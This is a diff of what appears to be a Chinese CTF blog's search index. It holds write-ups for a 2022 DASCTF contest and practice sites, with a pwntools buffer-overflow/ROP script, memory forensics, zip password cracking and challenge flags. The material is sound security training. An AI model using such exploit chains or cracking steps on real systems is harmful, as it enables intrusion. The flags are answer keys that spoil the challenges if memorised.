+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./MyCanary2&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;node4.buuoj.cn&#x27;, 28231)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./MyCanary2&#x27;</span>)</span><br><span class="line">system_plt = elf.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x0401613</span></span><br><span class="line">ret = <span class="number">0x040101a</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Input your choice\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x6c</span> + p32(<span class="number">0</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + p64(pop_rdi) + p64(<span class="number">0x04020F0</span>) + p64(system_plt)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Show me the code:\n&#x27;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Input your choice\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;But now, I have a new Secret.&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Input your choice\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="ez-forenisc题"><a href="#ez-forenisc题" class="headerlink" title="ez_forenisc题"></a>ez_forenisc题</h2><p>下载附件</p>
+<p>得到pc.raw和pc.wmdk，，放入取证大师中发现是个bitlocker加密的磁盘</p>
+<p>立马转移注意到pc.raw上，是个内存镜像。直接用EFDD梭出恢复密钥</p>
+<p>060841-363737-551397-247489-310134-034430-598312-215853</p>
+<p>用取证大师进行解密</p>
+<img src="/2022/07/25/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image002.gif" class="" title="图片">
+
+<p>发现有个压缩包，导出，发现是张png图片，用stegsolve发现了rgb的0通道藏了压缩包</p>
+<img src="/2022/07/25/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image004.gif" class="" title="图片">
+
+<p>保存下来，发现压缩包损坏，直接使用winrar自带的修复功能修复，发现是个加密压缩包</p>
+<p>看到了压缩包还有提示</p>
+<img src="/2022/07/25/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image006.gif" class="" title="图片">
+
+<p>看来要找账户密码，用passwarekit也能梭出来</p>
+<img src="/2022/07/25/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image008.gif" class="" title="图片">
+
+<p>550f37c7748e</p>
+<p>解压得到八进制的数</p>
+<img src="/2022/07/25/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image010.gif" class="" title="图片">
+
+<img src="/2022/07/25/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image012.gif" class="" title="图片">
+
+<p>转为16进制是得到key是358daebef0b7d，貌似是什么的一个密钥，继续看看pc.raw</p>
+<p>用volatility分析一下，发现screenshot的截图有信息</p>
+<img src="/2022/07/25/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image014.gif" class="" title="图片">
+
+<p>提示了thes3cret，filescan查找该关键字</p>
+<img src="/2022/07/25/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image016.jpg" class="" title="图片">
+
+<p>发现了个文件，给它dump下来</p>
+<img src="/2022/07/25/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image018.gif" class="" title="图片">
+
+<p>记事本打开发现密文</p>
+<img src="/2022/07/25/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image020.gif" class="" title="图片">
+
+<p>接下来就是进行aes解密了</p>
+<img src="/2022/07/25/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image022.gif" class="" title="图片">
+
+<p>DASCTF{2df05d6846ea7a0ba948da44daa7dc88}</p>
+<h2 id="哆来咪发唆拉西哆"><a href="#哆来咪发唆拉西哆" class="headerlink" title="哆来咪发唆拉西哆"></a>哆来咪发唆拉西哆</h2><p>首先得到一个pdf，binwalk后有个zip，解压后有个txt</p>
+<img src="/2022/07/25/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image024.gif" class="" title="图片">
+
+<p>发现这应该是圆周率的后面的位数</p>
+<img src="/2022/07/25/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image026.gif" class="" title="图片">
+
+<img src="/2022/07/25/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image028.gif" class="" title="图片">
+
+<img src="/2022/07/25/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image030.gif" class="" title="图片">
+
+<img src="/2022/07/25/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image032.gif" class="" title="图片">
+
+<p>前一组都是255而后一组数都是211，根据数组的特性用脚本将数组转化</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">pi=<span class="string">&#x27;3.14159265358979323846264338327950288419716939937510582097494459230781640628620899862803482534211706798214808651328230664709384460955058223172535940812848111745028410270193852110555964462294895493038196442881097566593344612847564823378678316527120190914564856692346034861045432664821339360............5225161050702705623526601276484830840761183013052793205427462865403603674532865105706587488225698157936789766974220575059683440869735020141020672358502007245225632651341055924019027421624843914035998953539459094407046912091409387001264560016237428802109276457931065792295524988727584610126483699989225695968815920560010165525637567875678&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;whatisthis.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)<span class="keyword">as</span> f:</span><br><span class="line"></span><br><span class="line">  lines=f.readlines()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line"></span><br><span class="line">  line=<span class="built_in">str</span>(line,encoding=<span class="string">&#x27;utf-8&#x27;</span>,errors=<span class="string">&#x27;strict&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  a = []</span><br><span class="line"></span><br><span class="line">  a = re.findall(<span class="string">&quot;\d+\.?\d*&quot;</span>, line)</span><br><span class="line"></span><br><span class="line">  <span class="built_in">list</span>=[]</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line"></span><br><span class="line">   s=<span class="built_in">int</span>(a[i])</span><br><span class="line"></span><br><span class="line">   <span class="built_in">list</span>.append(pi[s:s+<span class="number">3</span>:])</span><br><span class="line"></span><br><span class="line">  str_dec=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(<span class="built_in">list</span>[<span class="number">1</span>])):</span><br><span class="line"></span><br><span class="line">   s= <span class="built_in">list</span>[<span class="number">0</span>][i]</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> <span class="built_in">list</span>[<span class="number">0</span>][i]==<span class="built_in">list</span>[<span class="number">1</span>][i] <span class="keyword">and</span> <span class="built_in">list</span>[<span class="number">0</span>][i]==<span class="built_in">list</span>[<span class="number">2</span>][i] <span class="keyword">and</span> <span class="built_in">list</span>[<span class="number">0</span>][i]==<span class="built_in">list</span>[<span class="number">3</span>][i]:</span><br><span class="line"></span><br><span class="line">​     str_dec+=s</span><br><span class="line"></span><br><span class="line">  str_hex=<span class="built_in">hex</span>(<span class="built_in">int</span>(str_dec))</span><br><span class="line"></span><br><span class="line">  str_hex=str_hex[<span class="number">2</span>:<span class="number">4</span>:]</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">len</span>(str_hex)==<span class="number">1</span>:</span><br><span class="line"></span><br><span class="line">   str_hex=<span class="string">&#x27;0&#x27;</span>+str_hex</span><br><span class="line"></span><br><span class="line">  <span class="built_in">print</span>(str_hex,end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<img src="/2022/07/25/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image034.gif" class="" title="图片">
+
+<p>运行得到</p>
+<p><code>ffd8ffe11b0245786966000049492a00080000000c000001030001000000ee02000001010300010000001a02000002010300030000009e0000000601030001000000020000001201030001000000010000001501030001000000030000001a01050001000000a40000001b01050001000000ac000000280103000100000002000000310102001e000000b40000003201020014000000d20000006987040001000000e80000002001000008000800080080fc0a001027000080fc0a001027000041646f62652050686f746f73686f7020435336202857696e646f77732900323032323a30343a32382031303a31343a35380000000400009007000............55d8abb15762aec55d8abb15762aec55d8abb15762aec55d8abb15762aec55d8abb15762aec55d8abb15762aec55d8abb15762aec55d8abb15762aec55d8abb15762aec55d8abb15762aec55d8abb15762aec55d8abb15762aec55d8abb15762aec55d8abb15762aec55d8abb15762aec55d8abb15762aec55d8abb15762aec593b15762c5d8abb15762aff00ffd9</code></p>
+<img src="/2022/07/25/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image036.gif" class="" title="图片">
+
+<p>转化后得到一张图片，保存后发现</p>
+<img src="/2022/07/25/2022DASCTF%E8%B5%8B%E8%83%BD%E8%B5%9B/clip_image038.jpg" class="" title="图片">
+
+<p>flag是10000后缺失的30个数字</p>
+<p>DASCTF{566722796619885782794848855834}</p>
+]]></content>
+      <categories>
+        <category>比赛</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>misc</tag>
+        <tag>web</tag>
+        <tag>Crypto</tag>
       </tags>
   </entry>
   <entry>
@@ -409,8 +409,8 @@
       <tags>
         <tag>pwn</tag>
         <tag>misc</tag>
-        <tag>web</tag>
         <tag>re</tag>
+        <tag>web</tag>
       </tags>
   </entry>
   <entry>
@@ -845,6 +845,34 @@
       </tags>
   </entry>
   <entry>
+    <title>Sleuth Kit、Autopsy 的使用</title>
+    <url>/2022/06/19/Sleuth%20Kit%E3%80%81Autopsy%20%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
+    <content><![CDATA[<p>这是picoctf中涉及到的一个工具，配置的教程网上有，这里记录一下我在过程当中遇到的问题</p>
+<p>这是教程网站：</p>
+<p><a href="https://linux.cn/article-5541-1.html">https://linux.cn/article-5541-1.html</a></p>
+<p>因为不懂，所以尽管跟着教程走也走了不少的弯路，这里建议大家跟着教程走，所以Autopsy 的版本最好和教程一样。这是下载Autopsy 2.24源码的网址：</p>
+<p><a href="https://sourceforge.net/projects/autopsy/files/autopsy/2.24/">https://sourceforge.net/projects/autopsy/files/autopsy/2.24/</a></p>
+<p>也可以跟着官网去配置最新版本（<a href="http://www.sleuthkit.org/sleuthkit/">http://www.sleuthkit.org/sleuthkit/</a> 这是官网，Autopsy 也可以在里面找到），那个稍微有些麻烦，可能会有不断地报错，但如果对linux命令熟悉且精通的话，那大可以忽略我的话。</p>
+<p>这里就说说2.24版本，首先我们需要用root权限保持Autopsy 的后台开启着，不然他就会报错（记住要用root权限）</p>
+<img src="/2022/06/19/Sleuth%20Kit%E3%80%81Autopsy%20%E7%9A%84%E4%BD%BF%E7%94%A8/wps4.jpg" class="" title="img"> 
+
+<p>这是报错情况</p>
+<img src="/2022/06/19/Sleuth%20Kit%E3%80%81Autopsy%20%E7%9A%84%E4%BD%BF%E7%94%A8/wps5.jpg" class="" title="img"> 
+
+<p>这样就可以了，根据链接打开工具</p>
+<img src="/2022/06/19/Sleuth%20Kit%E3%80%81Autopsy%20%E7%9A%84%E4%BD%BF%E7%94%A8/wps6.jpg" class="" title="img"> 
+
+<p>接下来可以New Case 跟着上面的教程走，中间如果出现了没有发现下一步的按钮时，建议试一下重启虚拟机，重新来一遍。在里面你可以选择查看整个磁盘，也可以查看磁盘的一个分区。总之，多用用就行了。在下载的过程中如果遇到了报错，可以根据报错去寻找解决的方案。最重要的是找到自己可以配置成功的版本，启动并使用工具。</p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+        <category>misc笔记</category>
+      </categories>
+      <tags>
+        <tag>misc</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>(BJDCTF2020)Mark loves cat</title>
     <url>/2022/07/02/%5BBJDCTF2020%5DMark%20loves%20cat/</url>
     <content><![CDATA[<p>打开后发现是一个网页，这时候想到可能是某些文件泄露（常见的什么www文件或者git文件泄露），所以使用dirsearch扫描发现是git文件泄露，所以可以使用工具githack将泄露的git文件进行获取</p>
@@ -911,34 +939,6 @@
       </categories>
       <tags>
         <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Sleuth Kit、Autopsy 的使用</title>
-    <url>/2022/06/19/Sleuth%20Kit%E3%80%81Autopsy%20%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
-    <content><![CDATA[<p>这是picoctf中涉及到的一个工具，配置的教程网上有，这里记录一下我在过程当中遇到的问题</p>
-<p>这是教程网站：</p>
-<p><a href="https://linux.cn/article-5541-1.html">https://linux.cn/article-5541-1.html</a></p>
-<p>因为不懂，所以尽管跟着教程走也走了不少的弯路，这里建议大家跟着教程走，所以Autopsy 的版本最好和教程一样。这是下载Autopsy 2.24源码的网址：</p>
-<p><a href="https://sourceforge.net/projects/autopsy/files/autopsy/2.24/">https://sourceforge.net/projects/autopsy/files/autopsy/2.24/</a></p>
-<p>也可以跟着官网去配置最新版本（<a href="http://www.sleuthkit.org/sleuthkit/">http://www.sleuthkit.org/sleuthkit/</a> 这是官网，Autopsy 也可以在里面找到），那个稍微有些麻烦，可能会有不断地报错，但如果对linux命令熟悉且精通的话，那大可以忽略我的话。</p>
-<p>这里就说说2.24版本，首先我们需要用root权限保持Autopsy 的后台开启着，不然他就会报错（记住要用root权限）</p>
-<img src="/2022/06/19/Sleuth%20Kit%E3%80%81Autopsy%20%E7%9A%84%E4%BD%BF%E7%94%A8/wps4.jpg" class="" title="img"> 
-
-<p>这是报错情况</p>
-<img src="/2022/06/19/Sleuth%20Kit%E3%80%81Autopsy%20%E7%9A%84%E4%BD%BF%E7%94%A8/wps5.jpg" class="" title="img"> 
-
-<p>这样就可以了，根据链接打开工具</p>
-<img src="/2022/06/19/Sleuth%20Kit%E3%80%81Autopsy%20%E7%9A%84%E4%BD%BF%E7%94%A8/wps6.jpg" class="" title="img"> 
-
-<p>接下来可以New Case 跟着上面的教程走，中间如果出现了没有发现下一步的按钮时，建议试一下重启虚拟机，重新来一遍。在里面你可以选择查看整个磁盘，也可以查看磁盘的一个分区。总之，多用用就行了。在下载的过程中如果遇到了报错，可以根据报错去寻找解决的方案。最重要的是找到自己可以配置成功的版本，启动并使用工具。</p>
-]]></content>
-      <categories>
-        <category>笔记</category>
-        <category>misc笔记</category>
-      </categories>
-      <tags>
-        <tag>misc</tag>
       </tags>
   </entry>
   <entry>
@@ -1432,6 +1432,21 @@
       </tags>
   </entry>
   <entry>
+    <title>embryoio level1</title>
+    <url>/2022/06/08/embryoio-level1/</url>
+    <content><![CDATA[<h2 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h2><p>会用基本的Linux指令</p>
+<h2 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h2><h3 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h3><p><img src="/2022/06/08/embryoio-level1/level1.png" alt="level1"></p>
+<p>可以看到进入challenge目录后运行题目程序就得到了一个flag</p>
+]]></content>
+      <categories>
+        <category>刷题</category>
+        <category>pwncollege刷题</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>embryoio level36~level59</title>
     <url>/2022/07/12/embryoio%20level36~level59/</url>
     <content><![CDATA[<h1 id="embryoio-level36-level47"><a href="#embryoio-level36-level47" class="headerlink" title="embryoio level36~level47"></a>embryoio level36~level47</h1><h2 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h2><p>Linux终端和shell脚本的管道符使用</p>
@@ -1451,21 +1466,6 @@
 <p>编写python脚本运行后又出现需要管道接收输出的提示。</p>
 <h3 id="python脚本"><a href="#python脚本" class="headerlink" title="python脚本"></a>python脚本</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#===============================level48===============================</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io1 = subprocess.Popen(<span class="string">&#x27;/challenge/embryoio_level48&#x27;</span>, stdout=PIPE)</span><br><span class="line">io2 = subprocess.Popen(<span class="string">&#x27;cat&#x27;</span>, stdin=io1.stdout, stdout=PIPE)</span><br><span class="line">output = io2.communicate()[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(output)</span><br><span class="line"></span><br><span class="line"><span class="comment">#===============================level49===============================</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io1 = subprocess.Popen(<span class="string">&quot;/challenge/embryoio_level49&quot;</span>, stdout=PIPE)</span><br><span class="line">io2 = subprocess.Popen([<span class="string">&#x27;grep&#x27;</span>, <span class="string">&#x27;pwn&#x27;</span>], stdin=io1.stdout, stdout=PIPE)</span><br><span class="line">output = io2.communicate()[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(output)</span><br><span class="line"></span><br><span class="line"><span class="comment">#===============================level50===============================</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io1 = subprocess.Popen(<span class="string">&quot;/challenge/embryoio_level50&quot;</span>, stdout=PIPE)</span><br><span class="line">io2 = subprocess.Popen([<span class="string">&#x27;sed&#x27;</span>, <span class="string">&#x27;1d&#x27;</span>], stdin=io1.stdout, stdout=PIPE)</span><br><span class="line">output = io2.communicate()[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(output)</span><br><span class="line"></span><br><span class="line"><span class="comment">#===============================level51===============================</span></span><br><span class="line"><span class="comment">#将逆序的flag复制到文本里，再rev输出</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io1 = subprocess.Popen(<span class="string">&quot;/challenge/embryoio_level51&quot;</span>, stdout=PIPE)</span><br><span class="line">io2 = subprocess.Popen(<span class="string">&#x27;rev&#x27;</span>, stdin=io1.stdout, stdout=PIPE)</span><br><span class="line">output = io2.communicate()[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(output)</span><br><span class="line"></span><br><span class="line"><span class="comment">#===============================level52===============================</span></span><br><span class="line"><span class="comment">#运行后输入密码获得flag</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io1 = subprocess.Popen(<span class="string">&#x27;cat&#x27;</span>, stdout=PIPE)</span><br><span class="line">io2 = subprocess.Popen(<span class="string">&quot;/challenge/embryoio_level52&quot;</span>, stdin=io1.stdout)</span><br><span class="line">output = io1.communicate()[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(output)</span><br><span class="line"></span><br><span class="line"><span class="comment">#===============================level53===============================</span></span><br><span class="line"><span class="comment">#运行后逆序输入密码获得flag</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io1 = subprocess.Popen(<span class="string">&#x27;rev&#x27;</span>, stdout=PIPE)</span><br><span class="line">io2 = subprocess.Popen(<span class="string">&quot;/challenge/embryoio_level53&quot;</span>, stdin=io1.stdout)</span><br><span class="line">output = io1.communicate()[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(output)</span><br><span class="line"></span><br><span class="line"><span class="comment">#===============================level54~level59===============================</span></span><br><span class="line"><span class="comment">#又是一遍“十万年轮回”，题目和上诉题目差不多，题解参考上诉脚本。</span></span><br></pre></td></tr></table></figure>
 
-]]></content>
-      <categories>
-        <category>刷题</category>
-        <category>pwncollege刷题</category>
-      </categories>
-      <tags>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>embryoio level1</title>
-    <url>/2022/06/08/embryoio-level1/</url>
-    <content><![CDATA[<h2 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h2><p>会用基本的Linux指令</p>
-<h2 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h2><h3 id="运行程序"><a href="#运行程序" class="headerlink" title="运行程序"></a>运行程序</h3><p><img src="/2022/06/08/embryoio-level1/level1.png" alt="level1"></p>
-<p>可以看到进入challenge目录后运行题目程序就得到了一个flag</p>
 ]]></content>
       <categories>
         <category>刷题</category>
@@ -1628,54 +1628,6 @@
       </tags>
   </entry>
   <entry>
-    <title>各种压缩包的加密</title>
-    <url>/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/</url>
-    <content><![CDATA[<p>拿到附件，查看了下四个加密压缩包，貌似分别代表了不同的加密方式</p>
-<p>第一个a.zip</p>
-<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image002.gif" class="" title="图片">
-
-<p>看了下有三个文件，1.txt，2.txt</p>
-<p>按照套路应该是CRC32爆破没错了，试试看</p>
-<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image004.gif" class="" title="图片">
-
-<p>看到了两串很明显的字符，<em>pass_和_word</em></p>
-<p>所以压缩包密码应该就是_pass__word_，成功打开压缩包，得到1&#x2F;4张二维码，继续</p>
-<p>第二个f.zip</p>
-<p>根据压缩包的提示应该是可以直接爆破，先试试最常规的纯数字</p>
-<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image006.gif" class="" title="图片">
-
-<p>五位数字爆破成功密码是61825</p>
-<p>第三个g.zip</p>
-<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image008.gif" class="" title="图片">
-
-<p>根据文件名可以知道是明文爆破，这里由于会有一些压缩器的问题，所以就不分离出再进行压缩了，直接准备两个文件进行文件的删除</p>
-<p>删除到如下两幅图所示，相当于加密的和不加密的分离开</p>
-<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image010.gif" class="" title="图片">
-
-<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image012.gif" class="" title="图片">
-
-<p>进行明文爆破，成功</p>
-<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image014.gif" class="" title="图片">
-
-<p>第四个压缩包l.zip</p>
-<p>打开就一个文件，可能会是伪加密，试试修改下16进制数据</p>
-<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image016.gif" class="" title="图片">
-
-<p>能够解压</p>
-<p>这样四张分开的二维码图片就齐了，用PowerPoint拼起来看看，进行扫描</p>
-<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image018.gif" class="" title="图片">
-
-<p>得到flag，flag{d62427d8f843c98dcfa89f0ba0d1e6fe}</p>
-]]></content>
-      <categories>
-        <category>笔记</category>
-        <category>misc笔记</category>
-      </categories>
-      <tags>
-        <tag>misc</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>关于Oracle VM VirtualBox如何使用软驱的问题</title>
     <url>/2022/06/19/%E5%85%B3%E4%BA%8EOracle%20VM%20VirtualBox%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BD%AF%E9%A9%B1%E7%9A%84%E9%97%AE%E9%A2%98/</url>
     <content><![CDATA[<p>近期做到了一道题目，里面需要用到在虚拟机上挂载软盘的知识，查阅了一些资料，在这里进行一个总结。</p>
@@ -1721,6 +1673,54 @@
       </categories>
       <tags>
         <tag>其它</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>各种压缩包的加密</title>
+    <url>/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/</url>
+    <content><![CDATA[<p>拿到附件，查看了下四个加密压缩包，貌似分别代表了不同的加密方式</p>
+<p>第一个a.zip</p>
+<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image002.gif" class="" title="图片">
+
+<p>看了下有三个文件，1.txt，2.txt</p>
+<p>按照套路应该是CRC32爆破没错了，试试看</p>
+<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image004.gif" class="" title="图片">
+
+<p>看到了两串很明显的字符，<em>pass_和_word</em></p>
+<p>所以压缩包密码应该就是_pass__word_，成功打开压缩包，得到1&#x2F;4张二维码，继续</p>
+<p>第二个f.zip</p>
+<p>根据压缩包的提示应该是可以直接爆破，先试试最常规的纯数字</p>
+<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image006.gif" class="" title="图片">
+
+<p>五位数字爆破成功密码是61825</p>
+<p>第三个g.zip</p>
+<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image008.gif" class="" title="图片">
+
+<p>根据文件名可以知道是明文爆破，这里由于会有一些压缩器的问题，所以就不分离出再进行压缩了，直接准备两个文件进行文件的删除</p>
+<p>删除到如下两幅图所示，相当于加密的和不加密的分离开</p>
+<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image010.gif" class="" title="图片">
+
+<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image012.gif" class="" title="图片">
+
+<p>进行明文爆破，成功</p>
+<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image014.gif" class="" title="图片">
+
+<p>第四个压缩包l.zip</p>
+<p>打开就一个文件，可能会是伪加密，试试修改下16进制数据</p>
+<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image016.gif" class="" title="图片">
+
+<p>能够解压</p>
+<p>这样四张分开的二维码图片就齐了，用PowerPoint拼起来看看，进行扫描</p>
+<img src="/2022/08/12/misc%E7%AC%94%E8%AE%B0_%E5%90%84%E7%A7%8D%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%9A%84%E5%8A%A0%E5%AF%86/clip_image018.gif" class="" title="图片">
+
+<p>得到flag，flag{d62427d8f843c98dcfa89f0ba0d1e6fe}</p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+        <category>misc笔记</category>
+      </categories>
+      <tags>
+        <tag>misc</tag>
       </tags>
   </entry>
   <entry>
@@ -1819,7 +1819,7 @@
 <p>​    print(“     To use this python script , you must install the tshark first.”)</p>
 <p>​    print(“     You can use <code>sudo apt-get install tshark</code> to install it”)</p>
 <p>​    print(“Author : “)</p>
